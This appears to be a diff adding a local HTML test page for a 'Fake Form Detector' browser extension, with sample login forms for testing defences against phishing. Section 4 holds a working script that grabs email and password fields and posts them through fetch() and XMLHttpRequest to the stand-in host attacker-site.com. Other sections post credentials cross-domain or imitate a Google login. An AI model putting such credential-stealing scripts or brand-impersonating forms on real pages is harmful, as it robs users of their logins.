@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>FFD Extension Test Page</title>
+  <style>
+    body { font-family: sans-serif; margin: 40px; }
+    section { margin-bottom: 60px; padding: 20px; border: 1px solid #ddd; border-radius: 6px; }
+    h2 { margin-top: 0; }
+    button { padding: 6px 14px; }
+    input { padding: 6px; margin: 4px 0; width: 260px; }
+  </style>
+</head>
+<body>
+
+<h1>Fake Form Detector – Test Site</h1>
+<p>Use this local page to test your extension features.</p>
+
+<hr>
+
+<!-- --------------------------------------------------------- -->
+<!-- 1. NORMAL LOGIN FORM (should NOT trigger warnings) -->
+<!-- --------------------------------------------------------- -->
+<section>
+  <h2>1. Normal Login Form (safe)</h2>
+  <form id="safeForm" action="/auth/login" method="POST">
+    <input name="username" type="text" placeholder="Username"><br>
+    <input name="password" type="password" placeholder="Password"><br>
+    <button type="submit">Login</button>
+  </form>
+</section>
+
+<!-- --------------------------------------------------------- -->
+<!-- 2. CROSS-DOMAIN LOGIN (should trigger: posts to different domain) -->
+<!-- --------------------------------------------------------- -->
+<section>
+  <h2>2. Cross-Domain Login (phishing simulation)</h2>
+  <form id="crossForm" action="https://malicious-example.com/steal" method="POST">
+    <input name="email" type="text" placeholder="Email"><br>
+    <input name="password" type="password" placeholder="Password"><br>
+    <button type="submit">Sign in</button>
+  </form>
+</section>
+
+<!-- --------------------------------------------------------- -->
+<!-- 3. Hidden Fields (should trigger: multiple hidden inputs) -->
+<!-- --------------------------------------------------------- -->
+<section>
+  <h2>3. Hidden Input Injection</h2>
+  <form id="hiddenForm" action="/weird" method="POST">
+    <input name="user" type="text" placeholder="Username"><br>
+    <input name="password" type="password" placeholder="Password"><br>
+    <input type="hidden" name="tracking1" value="yes">
+    <input type="hidden" name="tracking2" value="yes">
+    <button type="submit">Submit</button>
+  </form>
+</section>
+
+<!-- --------------------------------------------------------- -->
+<!-- 4. JavaScript Interception (AJAX credential exfiltration) -->
+<!-- --------------------------------------------------------- -->
+<section>
+  <h2>4. JavaScript Credential Exfiltration (AJAX)</h2>
+
+  <p>This form won’t submit normally; instead the JS sends credentials using <code>fetch()</code> and <code>XMLHttpRequest</code>.</p>
+
+  <form id="ajaxForm" onsubmit="stealData(event)">
+    <input name="email" type="text" placeholder="Email"><br>
+    <input name="password" type="password" placeholder="Password"><br>
+    <button type="submit">Send (AJAX exfiltration)</button>
+  </form>
+
+  <script>
+    function stealData(e) {
+      e.preventDefault();
+      const email = document.querySelector('#ajaxForm input[name=email]').value;
+      const password = document.querySelector('#ajaxForm input[name=password]').value;
+
+      // --- fetch exfiltration ---
+      fetch("https://attacker-site.com/creds", {
+        method: "POST",
+        body: JSON.stringify({ email, password })
+      });
+
+      // --- XHR exfiltration ---
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://attacker-site.com/creds2");
+      xhr.setRequestHeader("Content-Type", "application/json");
+      xhr.send(JSON.stringify({ email, password }));
+
+      alert("JS attempted to send your credentials.");
+    }
+  </script>
+</section>
+
+<!-- --------------------------------------------------------- -->
+<!-- 5. Fake-brand phishing test -->
+<!-- --------------------------------------------------------- -->
+<section>
+  <h2>5. Fake Brand Domain</h2>
+  <p>Title: <strong>Login to Google</strong></p>
+  
+  <form id="brandForm" action="/login" method="POST">
+    <input name="email" type="text" placeholder="Email"><br>
+    <input name="password" type="password" placeholder="Password"><br>
+    <button type="submit">Login</button>
+  </form>
+</section>
+
+</body>
+</html>
+
